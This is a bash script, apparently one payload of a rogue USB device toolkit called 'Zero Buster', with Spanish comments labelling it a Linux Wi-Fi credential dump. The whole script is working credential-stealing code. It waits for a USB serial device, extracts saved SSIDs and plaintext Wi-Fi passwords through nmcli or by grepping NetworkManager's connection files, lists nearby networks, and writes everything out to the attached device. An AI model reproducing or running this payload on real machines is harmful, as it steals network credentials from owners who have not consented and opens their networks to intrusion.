#!/bin/bash
# ==============================================================================
# Zero Buster - Payload 02: Linux Wi-Fi (Volcado de Credenciales)
# ==============================================================================
# Extrae SSIDs y contraseñas guardadas en NetworkManager y las envía por USB CDC.
# ==============================================================================

for i in $(seq 1 60); do
    dev=$(ls -t /dev/ttyACM* 2>/dev/null | head -n1)
    [ -n "$dev" ] && break
    sleep 0.2
done

if [ -n "$dev" ]; then
    sleep 0.5
    (
        echo '=== ZERO BUSTER (LINUX WIFI) ==='
        echo "Host: $(hostname)"
        echo "Date: $(date)"
        echo '=== Active Wi-Fi ==='
        if command -v nmcli >/dev/null 2>&1; then
            nmcli -w 1 -s dev wifi show-password 2>/dev/null
        fi
        echo '=== Profiles ==='
        found=0
        if command -v nmcli >/dev/null 2>&1; then
            for s in $(nmcli -w 1 -t -f NAME,TYPE c show 2>/dev/null | grep ':802-11-wireless' | cut -d: -f1); do
                found=1
                echo "SSID: $s"
                k=$(nmcli -w 1 -s -g 802-11-wireless-security.psk c show "$s" 2>/dev/null)
                echo "KEY : ${k:-(none)}"
                echo "---"
            done
        fi
        if [ "$found" -eq 0 ] && [ -d /etc/NetworkManager/system-connections ]; then
            for f in /etc/NetworkManager/system-connections/*; do
                if [ -f "$f" ]; then
                    found=1
                    echo "SSID: $(basename "$f" .nmconnection)"
                    grep -i 'psk=' "$f" 2>/dev/null
                    echo "---"
                fi
            done
        fi
        if [ "$found" -eq 0 ]; then
            echo "[!] No Wi-Fi profiles found or insufficient permissions."
        fi
        echo '=== Nearby ==='
        if command -v nmcli >/dev/null 2>&1; then
            nmcli -w 1 -f SSID,SIGNAL,SECURITY dev wifi list 2>/dev/null | head -n 10
        fi
        echo '<<<EOF>>>'
    ) > "$dev"
fi

